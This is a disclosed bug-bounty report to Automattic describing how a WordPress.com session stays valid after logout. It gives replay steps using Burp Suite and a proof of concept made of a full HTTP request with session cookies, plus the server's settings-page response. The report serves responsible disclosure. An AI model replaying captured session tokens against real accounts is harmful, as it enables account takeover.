@@ -1,0 +1,140 @@
+ReportLink:https://hackerone.com/reports/18503
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/mohaab007
+ReportedTo:Automattic(automattic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:16.08.2014 22:47:12
+
+Summary:
+
+hi,
+
+1- login to website
+
+2- go to your account settings
+
+3- capture the request while opening your account settings with burp suite proxy 
+
+4- send the request to repeater
+
+5- logout from website
+
+6- click on GO button to repeat the request again from repeater tab
+
+7- request is approved and validated because the old session is still valid in server side and is not invalidated properly :(
+
+read more about it:
+
+https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management
+
+
+Am I Vulnerable To 'Broken Authentication and Session Management'?
+
+Session IDs don’t timeout, or user sessions or authentication tokens, particularly single sign-on (SSO) tokens, aren’t properly invalidated during logout.
+
+
+
+NOTE: What i could say but i tested many many many websites popular and unpopular and all of them fixed that issue and destroyed  and invalidated session during logout :)
+
+I tested: Facebook, google, etsy and many many others and all of them are secure :)
+
+you need ti fix it ASAP
+
+
+
+POC:
+
+request:
+
+GET /wp-admin/admin-ajax.php?action=wpcom_load_template&template=settings.php&tcpg=&_=1404092392503 HTTP/1.1
+Host: wordpress.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: https://wordpress.com/settings/password/
+Cookie: wordpress=attacksecure%7C1498700135%7Cf984ae022a50fb3029898a3fa434c443; wordpress_sec=attacksecure%7C1498700135%7Cd3966032fd6f99fd1fdcc055869e5561; _wpndash=ae9fd68d7ce1b50f3680b625; _ga=GA1.2.1313860508.1403633926; ki_u=46849e3e-35fe-d1ad-fb04-b7a5a187d742; ki_t=1403633927683%3B1403633927683%3B1403639139242%3B1%3B12; km_uq=; km_lv=x; wordpress_eli=1; ki_r=http%3A//automattic.com/; optimizelySegments=%7B%22179190226%22%3A%22referral%22%2C%22178845731%22%3A%22false%22%2C%22178855892%22%3A%22ff%22%7D; optimizelyEndUserId=oeu1403639134931r0.445245652045105; optimizelyBuckets=%7B%7D; SSE_iframe_checkout_in_signup_20140403=original_a; SSE_signup_button_test_20140523=original_a; __utma=214977736.1313860508.1403633926.1403639221.1403639221.1; __utmz=214977736.1403639221.1.1.utmcsr=wordpress.com|utmccn=(referral)|utmcmd=referral|utmcct=/; km_ai=9%2FlSN8JE5051f5kuUom9JuOr7nA%3D; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in=attacksecure%7C1498700135%7C6b248167593acdb6895dc06b481a7620
+Connection: keep-alive
+
+
+
+
+response:
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Mon, 30 Jun 2014 02:01:29 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Vary: Accept-Encoding
+X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+Pragma: no-cache
+X-Frame-Options: SAMEORIGIN
+Content-Length: 95197
+
+<div class="tab has-sidebar" id="edit-settings">
+	<div class="right-column-outer">
+		<div class="edit-settings-header content-header">
+			<h2 class="title">My Account</h2>
+		</div>
+
+		<div id="security-nag">				<div class="security-nag-container">
+					<div class="noticon noticon-notice"></div>
+					<div class="security-nag-text"><p>Tighten your account's security: Two-step authentication is now available on WordPress.com. <a href='https://wordpress.com/settings/security/'>Enable Now</a> or <a href='http://en.support.wordpress.com/security/two-step-authentication/'>Learn More</a>.</p></div>
+					<div class="dismiss"><a style="text-decoration: none;" href="javascript:hide_security_nag()" class="noticon noticon-close"></a></div>
+				</div>
+				</div>			<script type="text/javascript">
+				jQuery( document ).ready( function( $ ) {
+					hide_security_nag = function() {
+						$.ajax( {
+							url: '/wp-admin/admin-ajax.php',
+							data: {
+								action: 'hide_security_nag',
+								nonce: 'acf3da9986',
+								user_id: 53588447							}
+						} );
+						$( '#security-nag' ).fadeOut( 'fast' );
+					}
+				} );
+			</script>
+		
+		<div id="edit-profile-content" class="right-column-inner">
+			
+			<form action="https://wordpress.com/wp-admin/?change-password=1" method="post" id="change-password-form" name="change-password-form" data-nonce="" >
+				<div id="password-content" class="hide section">
+					<p class="hide pass-result"></p>
+					<input type="hidden" id="newdash_settings_save_password" name="newdash_settings_save_password" value="08a1387fa0" /><input type="hidden" name="_wp_http_referer" value="/wp-admin/admin-ajax.php?action=wpcom_load_template&amp;template=settings.php&amp;tcpg=&amp;_=1404092392503" />
+					<h4 class="primary">Change Password</h4>
+					<p class="sectional">To update your password enter a new one below. Your password should be at least seven characters long. To make it stronger, use upper and lower case letters, numbers and symbols like ! " ? $ % ^ &amp; ).</p>
+
+					<table>
+						<tr id="password1">
+							<th><label for="pass1">New Password</label></th>
+							<td class="main" id="pass1-container">
+																	<input type="text" name="pass1" id="pass1" size="16" value="" autocomplete="off" />
+											<a href="#" id="wp-hide-password" class="wp-show-hide-password button button-secondary hide-if-no-js">Hide</a>
+																		<span class="description">If you can't think of a good password use the button below to generate one.</span>
+
+															<a href="#" id="wp-generate-password" class="sub-button button-secondary">Generate strong password</a>
+									<script type="text/javascript">
+								wpcom.better_password_enforcer.init( '#change-password-form', '#pass1', '#password-loading', '#pass-test-results', '#save-form' );
+							</script>
+							</td>
+						</tr>
+												<tr>
+							<th class="nobg"><span class="hide">Password Quality</span>&nbsp;</th>
+																	<td>
+										<span id="password-loading"><img src="https://s2.wp.com/i/loading/loading-64.gif" width="24" alt="Checking...">Checking...</span>
+										<div id="pass-test-results"></div>
+									</td>
+														</tr>
+					</table>
+				</div>
+			</form>
